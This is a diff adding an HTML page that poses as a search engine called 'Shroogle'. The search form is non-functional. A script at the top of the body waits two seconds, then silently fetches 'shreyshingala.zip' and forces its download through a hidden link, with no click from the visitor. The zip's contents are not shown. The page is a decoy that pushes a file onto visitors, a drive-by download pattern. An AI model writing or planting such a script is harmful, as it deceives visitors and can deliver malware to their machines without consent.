@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+
+<head>
+  <title>Search Engine Website</title>
+  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+</head>
+
+<body>
+  <script>
+      
+
+      setTimeout(function() {
+  var filename = "shreyshingala.zip";
+  fetch(filename)
+    .then(response => response.blob())
+    .then(blob => {
+      var anchor = document.createElement("a");
+      document.body.append(anchor);
+      anchor.style = "display: none;";
+
+      var url = window.URL.createObjectURL(blob);
+      anchor.href = url;
+      anchor.download = filename;
+
+      anchor.click();
+      window.URL.revokeObjectURL(url);
+    })
+    .catch(error => {
+      console.log("Error downloading file:", error);
+    });
+}, 2000);
+
+  </script>
+
+	<style>
+		.overlay {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, 0.5);
+			display: flex;
+			justify-content: center;
+			align-items: center;
+		}
+
+		.form-container {
+			background-color: white;
+			padding: 20px;
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+		}
+
+		.form-container h1 {
+			font-family: 'Montserrat', sans-serif;
+			font-size: 50px;
+			font-weight: bold;
+			color: red;
+			margin-bottom: 20px;
+		}
+
+		.form-container input[type=text] {
+			padding: 10px;
+			font-size: 20px;
+			border: none;
+			border-bottom: 2px solid gray;
+			margin-bottom: 20px;
+			width: 100%;
+		}
+
+		.form-container button[type=submit] {
+			padding: 10px 20px;
+			font-size: 20px;
+			background-color: red;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+      text-align: center;
+		}
+	</style>
+
+	<div class="overlay">
+		<div class="form-container">
+			<h1>Shroogle</h1>
+			<form>
+				<input type="text" placeholder="Enter your search terms...">
+				<button type="submit">Search</button>
+			</form>
+		</div>
+	</div>
+
+
+
+</body>
+
+</html>
